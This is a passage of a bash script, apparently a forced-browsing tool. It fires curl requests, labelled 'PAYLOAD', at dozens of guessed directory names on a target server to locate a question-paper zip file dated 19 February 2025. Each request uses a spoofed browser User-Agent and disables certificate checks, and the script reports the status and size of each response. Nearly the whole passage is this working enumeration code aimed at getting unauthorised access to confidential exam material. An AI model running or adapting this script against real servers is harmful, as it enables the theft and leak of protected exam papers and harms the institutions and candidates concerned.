${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerAccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
